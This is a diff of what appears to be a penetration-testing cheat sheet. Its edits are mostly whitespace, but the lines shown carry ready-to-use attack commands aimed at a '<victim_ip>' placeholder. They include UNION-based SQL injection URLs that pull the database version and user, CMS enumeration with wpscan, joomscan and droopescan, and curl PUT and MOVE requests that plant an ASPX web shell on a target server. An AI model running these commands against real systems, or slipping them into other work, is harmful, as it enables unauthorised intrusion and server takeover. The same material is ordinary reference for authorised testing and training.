@@ -53,7 +53,7 @@ SQL Injection (Manual Steps)
 #Find space to output db
  http://<victim_ip>/test.php?id=3 union select 1,2,3,4,5
 
-#Get db-version and username of the db-user;
+#Get db-username and db-version information from the database;
  http://<victim_ip>/test.php?id=3 union select 1,2,version(),4,5
  http://<victim_ip>/test.php?id=3 union select 1,2,user(),4,5
 
@@ -97,13 +97,13 @@ LFI to RCE
 CMS Enumeration
 
 #Wordpress
-wpscan --url http://<victim_ip>/ --enumerate p --enumerate u --enumerate t
+ wpscan --url http://<victim_ip>/ --enumerate p --enumerate u --enumerate t
 
 #Joomla
-joomscan -u  http://<victim_ip>/ --enumerate-components
+ joomscan -u  http://<victim_ip>/ --enumerate-components
 
 #Drupal
-./droopescan scan drupal -u <victim_ip>
+ ./droopescan scan drupal -u <victim_ip>
 
 ******************************************************************************************************************************
 
@@ -114,17 +114,17 @@ CURL
  curl -X PUT http://<victim_ip>/brc.txt -d @test.txt  #put to target
  curl http://<victim_ip>/brc.txt                      #call the file
  
- #Victim system put to shell  with curl;
-  cp /usr/share/webshells/aspx/cmdasp.aspx .
-  curl -X PUT http://<victim_ip>/brc_shell.txt -d @cmdasp.aspx
-  curl -X MOVE -H 'Destination:http://<victim_ip>/shell.aspx' http://<victim_ip>/brc_shell.txt
+#Victim system put to shell  with curl;
+ cp /usr/share/webshells/aspx/cmdasp.aspx .
+ curl -X PUT http://<victim_ip>/brc_shell.txt -d @cmdasp.aspx
+ curl -X MOVE -H 'Destination:http://<victim_ip>/shell.aspx' http://<victim_ip>/brc_shell.txt
   
  Note: When we shell the victim system as above, we can get run time error in the system. 
  The reason of this; the victim system noticed the shell we threw and erased the gaps.
  
- #To protect the spaces, we should use the command "--data-binary";
-  curl -X PUT http://<victim_ip>/brc_shell.txt --data-binary @shell.aspx
-  curl -X MOVE -H 'Destination:http://<victim_ip>/shell.aspx' http://<victim_ip>/brc_shell.txt
+#To protect the spaces, we should use the command "--data-binary";
+ curl -X PUT http://<victim_ip>/brc_shell.txt --data-binary @shell.aspx
+ curl -X MOVE -H 'Destination:http://<victim_ip>/shell.aspx' http://<victim_ip>/brc_shell.txt
 
 ******************************************************************************************************************************
 
@@ -154,7 +154,7 @@ Firstly add the domain information detected during port scans to the file "/etc/
 
  host -l <domain_name> <victim_ip>
 
-Note: "dnsrecon" tool can also be used for this.
+ Note: "dnsrecon" tool can also be used for this.
 
 -------------------------------------------------------------------------------------------------------------------------------
 
